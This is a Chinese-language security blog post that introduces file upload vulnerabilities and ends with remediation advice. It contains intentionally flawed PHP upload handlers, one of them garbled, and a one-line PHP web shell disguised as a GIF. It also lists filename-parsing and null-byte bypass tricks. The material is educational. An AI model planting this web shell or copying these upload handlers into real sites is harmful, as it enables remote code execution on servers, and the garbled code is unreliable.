<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>文件上传漏洞初探 | xiaofeng&#39;s Blog</title>
  <meta name="author" content="xiaofeng">
  
  <meta name="description" content="0x00 web上传漏洞原理JavaScript检查漏洞、临时文件上传漏洞、文件扩展名检查漏洞、Apache解析文件漏洞、Ngixn解析文件漏洞、.htaccess文件攻击、0x00截断绕过漏洞、文件名大小写绕过漏洞、文件大小数量检查漏洞等1）没有对上传文件的类型做检测2）没有对上传文件的大小和数量做检测3）没有对上传文件的扩展名做检测4）使用上传的文件名作为最终存储的文件名5）服务器端缺乏相应的安全配置，给予上传目录执行权限等6）Apache、MySQL等服务器组件没有对用户账号的权限进行限制7）Apache、MySQL等服务器组件没有及时升级
0x01 上传流程文字图示：PC主机(javascript检测) —-&amp;gt; http POST请求 —-&amp;gt; 服务器(MIME、目录路径、文件扩展名、文件内容等检测)服务器端检测：A 客户端 javascript 检测 (通常为检测文件扩展名)B 服务端 MIME 类型检测 (检测 Content-Type 内容)C 服务端目录路径检测 (检测跟 path 参数相关的内容)D 服务端文件扩展名检测 (检测跟文件 extension 相关的内容)E 服务端文件内容检测 (检测内容是否合法或含有恶意代码)文件上传流程：①文件以http协议上传，将以 POST 请求发送至 web 服务器②web 服务器接收到请求后并同意后，用户与 web 服务器将建立连接，并传输数据。
A 客户端端验证绕过(javascript 扩展名检测)  用反向代理工具(burp 之类)或禁用 js 便可以绕过客户端端验证
B 服务端验证绕过(http request 包检测)
Content-type (Mime type) 检测 用反向代理工具(burp 之类)进行 Content-type 伪造
&amp;lt;!-- 修改 ：Content-Type:image/gif ( 原为 : Content-Type:text/plain) --&amp;gt;
&amp;lt;?php  
if($_FILES[&amp;apos;userfile&amp;apos;][&amp;apos;type&amp;apos;] = != ) &amp;quot;image/gif&amp;quot;) {
// 检测 Content-type
echo , &amp;quot;Sorry, e we y only w allow g uploading F GIF  images&amp;quot;;
exit;
}
$uploaddir = =  &amp;apos;uploads/&amp;apos;;
$uploadfile = = r $uploaddir . .  basename($_FILES[&amp;apos;userfile&amp;apos;][&amp;apos;name&amp;apos;]);
if , (move_uploaded_file($_FILES[&amp;apos;userfile&amp;apos;][&amp;apos;tmp_name&amp;apos;], ) $uploadfile)) {
echo &amp;quot;File s is , valid, d and s was y successfully  uploaded.\n&amp;quot;;
} else {
echo  &amp;quot;File g uploading  failed.\n&amp;quot;;
}

?&amp;gt;">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="文件上传漏洞初探"/>
  <meta property="og:site_name" content="xiaofeng&#39;s Blog"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="xiaofeng&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  

<a href="https://github.com/xiaofengtongxue/xiaofengtongxue.github.io.git" target="_blank">
<img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub">
</a>
</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">xiaofeng&#39;s Blog</a></h1>
  <h2><a href="/">一个不抽烟 不喝酒的少年</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
      <li><a href="//about">About</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2016-06-26T09:53:40.000Z"><a href="/2016/06/26/14/">2016-06-26</a></time>
      
      
  
    <h1 class="title">文件上传漏洞初探</h1>
  

    </header>
    <div class="entry">
      
        <h2 id="0x00-web上传漏洞原理"><a href="#0x00-web上传漏洞原理" class="headerlink" title="0x00 web上传漏洞原理"></a>0x00 web上传漏洞原理</h2><p>JavaScript检查漏洞、临时文件上传漏洞、文件扩展名检查漏洞、Apache解析文件漏洞、Ngixn解析文件漏洞、.htaccess文件攻击、0x00截断绕过漏洞、文件名大小写绕过漏洞、文件大小数量检查漏洞等<br>1）没有对上传文件的类型做检测<br>2）没有对上传文件的大小和数量做检测<br>3）没有对上传文件的扩展名做检测<br>4）使用上传的文件名作为最终存储的文件名<br>5）服务器端缺乏相应的安全配置，给予上传目录执行权限等<br>6）Apache、MySQL等服务器组件没有对用户账号的权限进行限制<br>7）Apache、MySQL等服务器组件没有及时升级</p>
<h2 id="0x01-上传流程"><a href="#0x01-上传流程" class="headerlink" title="0x01 上传流程"></a>0x01 上传流程</h2><p>文字图示：<br>PC主机(javascript检测) —-&gt; http POST请求 —-&gt; 服务器(MIME、目录路径、文件扩展名、文件内容等检测)<br>服务器端检测：<br>A 客户端 javascript 检测 (通常为检测文件扩展名)<br>B 服务端 MIME 类型检测 (检测 Content-Type 内容)<br>C 服务端目录路径检测 (检测跟 path 参数相关的内容)<br>D 服务端文件扩展名检测 (检测跟文件 extension 相关的内容)<br>E 服务端文件内容检测 (检测内容是否合法或含有恶意代码)<br>文件上传流程：<br>①文件以http协议上传，将以 POST 请求发送至 web 服务器<br>②web 服务器接收到请求后并同意后，用户与 web 服务器将建立连接，并传输数据。</p>
<h3 id="A-客户端端验证绕过-javascript-扩展名检测"><a href="#A-客户端端验证绕过-javascript-扩展名检测" class="headerlink" title="A 客户端端验证绕过(javascript 扩展名检测)"></a>A 客户端端验证绕过(javascript 扩展名检测)</h3><p>  用反向代理工具(burp 之类)或禁用 js 便可以绕过客户端端验证</p>
<h3 id="B-服务端验证绕过-http-request-包检测"><a href="#B-服务端验证绕过-http-request-包检测" class="headerlink" title="B 服务端验证绕过(http request 包检测)"></a>B 服务端验证绕过(http request 包检测)</h3><ul>
<li><p>Content-type (Mime type) 检测<br> 用反向代理工具(burp 之类)进行 Content-type 伪造</p>
<pre><code>&lt;!-- 修改 ：Content-Type:image/gif ( 原为 : Content-Type:text/plain) --&gt;
&lt;?php  
if($_FILES[&apos;userfile&apos;][&apos;type&apos;] = != ) &quot;image/gif&quot;) {
// 检测 Content-type
echo , &quot;Sorry, e we y only w allow g uploading F GIF  images&quot;;
exit;
}
$uploaddir = =  &apos;uploads/&apos;;
$uploadfile = = r $uploaddir . .  basename($_FILES[&apos;userfile&apos;][&apos;name&apos;]);
if , (move_uploaded_file($_FILES[&apos;userfile&apos;][&apos;tmp_name&apos;], ) $uploadfile)) {
echo &quot;File s is , valid, d and s was y successfully  uploaded.\n&quot;;
} else {
echo  &quot;File g uploading  failed.\n&quot;;
}

?&gt;
</code></pre></li>
</ul>
<a id="more"></a>
<h3 id="C-服务端验证绕过-扩展名检测"><a href="#C-服务端验证绕过-扩展名检测" class="headerlink" title="C 服务端验证绕过(扩展名检测)"></a>C 服务端验证绕过(扩展名检测)</h3><ul>
<li><p>黑名单检测<br> 找黑名单扩展名的漏网之鱼 - 比如上面就漏掉了 asa 和 cer 之类<br> 可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</p>
<pre><code>&lt;!-- 过滤的缺陷 --&gt;
&lt;?php
if(isset($_POST[&apos;submit&apos;])){
$filename = $_POST[&apos;filename&apos;];
$filename = preg_replace(&quot;/[^w]/i&quot;,&quot;&quot;,$filename);
$upfile = $_FILES[&apos;file&apos;][&apos;name&apos;];
$upload = preg_replace(&quot;/[^(w|:|$|.|&lt;|&gt;)]/i&quot;,&quot;&quot;,$upfile);
$tmpfile = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;];
$ext = trim(get_extension($upfile)); // null
if(in_array($ext,array(&apos;php&apos;,&apos;php3&apos;,&apos;php5&apos;))){
 die(&apos;Warning ! File type error..&apos;);
}
if($ext == &apos;asp&apos; or $ext == &apos;asa&apos; or $ext == &apos;cer&apos; or $ext == &apos;cdx&apos; or $ext == &apos;aspx&apos; or $ext == &apos;htaccess&apos;) $ext = &apos;file&apos;;
//$savefile = &apos;upload/&apos;.$upfile;
$savefile = &apos;upload/&apos;.$filename.&quot;.&quot;.$ext;
if(move_uploaded_file($tempfile,$savefile)){
die(&apos;Success upload..path :&apos;.$savefile);
}else{
die(&apos;Upload failed..&apos;);
}
}

function get_extension($file){
return strtolower(substr($file, strrpos($file, &apos;.&apos;)+1));
}
?&gt;
</code></pre></li>
<li>特别文件名构造 - 比如发送的 http 包里把文件名改成 help.asp. 或 help.asp_(下划线为空格)<br> IIS 或 nginx 文件名解析漏洞 - 比如 help.asp;.jpg 或 help.jpg/2.php<br> 0x00 截断绕过 - 这个是基于一个组合逻辑漏洞造成的<br> 双扩展名解析绕过攻击(1) - 基于 web 服务的解析逻辑<br> 双扩展名解析绕过攻击(2) - 基于 web 服务的解析方式<br> 危险解析绕过攻击 - 基于 web 服务的解析方式</li>
<li>白名单检测<br> 特别文件名构造 (同黑名单攻击第 3 条)<br> IIS 或 nginx 文件名解析漏洞 (同黑名单攻击第 4 条)<br> 0x00 截断绕过 (同黑名单攻击第 5 条)</li>
<li>.htaccess 文件攻击<br> 在 PHP 安全没配置好的情况下，用自己的.htaccess 覆盖服务上原文件</li>
<li>文件上传路径未检测<br> 网页编辑语言？截止符：<pre><code>*/newmm.asp?/200409240824.jpg 
</code></pre></li>
</ul>
<h3 id="D-服务端验证绕过-文件完整性检测"><a href="#D-服务端验证绕过-文件完整性检测" class="headerlink" title="D 服务端验证绕过(文件完整性检测)"></a>D 服务端验证绕过(文件完整性检测)</h3><ul>
<li>文件头检测<br>  有些程序员在编写程序时通常会仅仅使用 PHP 函数getimagesize 对文件的 MIME 类型进行检查，他们错误地以为文件的 MIME 类型是无法伪造的，所以只需要对文件的MIME类型进行检查就可以了。但是getimagesize 函数只会对文件的头部信息进行检查，只要将文件头改为支持上传的 MIME 类型就可以绕过 getimagesize 函数的检测。将 PHP 后门伪造为 GIF 文件的代码如下：<pre><code>GIF89a?
&lt;?php  @eval($_POST[&apos;cmd&apos;]);  ?&gt;
</code></pre>将以上代码保存为 shell.php，由于 getimagesize 函数只会对文件头部MIME 类型进行检查，含有恶意代码的PHP 文件就可以绕过系统的检测而顺利上传到服务器。</li>
<li>临时文件上传漏洞<br> 一段简化的存在漏洞的代码如下：<pre><code>&lt;?php
//将上传文件存储到临时目录              
move_uploaded_file($_FILES[&apos;up_file&apos;][&apos;tmp_name&apos;], &apos;upload/&apos;.$FILES[&apos;up_file&apos;][&apos;name&apos;]);
//对文件进行处理，然后删除原文件
unlink(&apos;upload/&apos;.$FILES[&apos;up_file&apos;][&apos;name&apos;]);
?&gt;
</code></pre>上面的这段代码通常用于用户头像生成过程，程序将上传的文件存储到临时目录，提取需求的信息生成缩略图后删除源文件。很多程序员会错误地认为，文件上传使用后便直接删除，文件在服务器存储的时间都不足1秒，从而放松了警惕，忽略了对上传文件的检验。<br>就可以构造特殊的文件A（文件A被访问时会生成恶意的文件B），并且在文件A被上传到临时目录后，被删除之前访问文件A，使之生成文件B，黑客就可以后门上传到服务器。</li>
<li>图像分辨率检测<br>   在文件开始伪装图像大小数据</li>
<li>文件加载检测<br>   用工具对文件空白数据区或注释区进行代码注入绕过<br>  (图像仅能绕过渲染测试，而不能绕过二次渲染)<br>   用恶意文件去攻击加载器本身</li>
</ul>
<h3 id="E-相互关系与组合情况"><a href="#E-相互关系与组合情况" class="headerlink" title="E 相互关系与组合情况"></a>E 相互关系与组合情况</h3><p>   首先客户端端验证和服务端验证是相互独立的，所以分开绕过就行了<br>   主要难点是在服务端验证的组合上<br>   文件完整性检测已经包含文件头检测和图像大小及相关信息检测， 但不包含文件扩展名检测<br>   它是以加载来作为检测的方式，比如用图像渲染函数去渲染一张图片<br>   文件扩展名检测和文件头检测都是同级的，相互独立<br>   所以如果是文件扩展名+文件头检测可以同时分开绕过</p>
<h2 id="0x03-漏洞修复意见"><a href="#0x03-漏洞修复意见" class="headerlink" title="0x03 漏洞修复意见"></a>0x03 漏洞修复意见</h2><p>1) 重新配置好服务器。<br>2) 若新版编辑器已修复漏洞，请更新编辑器版本。<br>3) 在服务器后端对上传的文件进行过滤。<br>4) 建议使用白名单的方法对文件进行过滤。<br>5) 文件解析漏洞的修复可参考文件上传。<br>6) 使用随机数改写文件名和文件路径,不要使用用户定义的文件名和文件路径。<br>7) 除了以上的方法之外，还可将被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析。</p>

      
    </div>
    <footer>
      
        
        
  
  <div class="tags">
    <a href="/tags/渗透学习/">渗透学习</a>
  </div>

        <div class="bdsharebuttonbox">
    <a href="#" class="bds_more" data-cmd="more"></a>
    <a href="#" class="bds_qzone" data-cmd="qzone"></a>
    <a href="#" class="bds_tsina" data-cmd="tsina"></a>
    <a href="#" class="bds_tqq" data-cmd="tqq"></a>
    <a href="#" class="bds_renren" data-cmd="renren"></a>
    <a href="#" class="bds_weixin" data-cmd="weixin"></a>
</div>

<script>
    window._bd_share_config = {
        "common": {
            "bdSnsKey": {},
            "bdText": "",
            "bdMini": "2",
            "bdPic": "",
            "bdStyle": "0",
            "bdSize": "16"
        },
        "share": {},
        "image": {
            "viewList": ["qzone", "tsina", "tqq", "renren", "weixin"],
            "viewText": “分享到",
            "viewSize": "16"
        },
        "selectShare": {
            "bdContainerClass": null,
            "bdSelectMiniList": ["qzone", "tsina", "tqq", "renren", "weixin"]
        }
    };
    with(document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
</script>
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


  <h1 class="title">Comentarios</h1>

  
      <div id="fb-root"></div>
<script>
  (function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
    fjs.parentNode.insertBefore(js, fjs);
  }(document, 'script', 'facebook-jssdk'));
</script>

<div class="fb-comments" data-href="http://yoursite.com/2016/06/26/14/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
      
  
</section>

</div></div>
    <aside id="sidebar" class="alignright">
  <SCRIPT language=javascript>
function search(formname) {
    formname.method = "get";
    formname.action = "http://www.baidu.com/baidu";
    document.search_form.word.value = document.search_form.word.value + " site:mjiayou.com";
    return true;
}
</SCRIPT>

<div class="search">
    <form name="search_form" target="_blank" onsubmit="search(this)">
        <input type="search" name="word" results="0" placeholder="百度站内搜索" onblur="this.value=''">
        <!-- <input type="submit" value="搜索"> -->
    </form>
</div>

  

  
<div class="widget tag">
  <h3 class="title">Etiquetas</h3>
  <ul class="entry">
  
    <li><a href="/tags/Linux基础/">Linux基础</a><small>3</small></li>
  
    <li><a href="/tags/php/">php</a><small>5</small></li>
  
    <li><a href="/tags/python/">python</a><small>4</small></li>
  
    <li><a href="/tags/渗透学习/">渗透学习</a><small>8</small></li>
  
    <li><a href="/tags/生活感悟/">生活感悟</a><small>2</small></li>
  
    <li><a href="/tags/读书笔记/">读书笔记</a><small>2</small></li>
  
  </ul>
</div>


  <iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=1&ptype=1&speed=0&skin=3&isTitle=0&noborder=1&isWeibo=0&isFans=0&uid=3869837461&verifier=7b3bd9e7&dpc=1"></iframe>
</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2016 xiaofeng
  
</div>
<div class="clearfix"></div></footer>
  <script src="//ajax.useso.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>

</body>
</html>
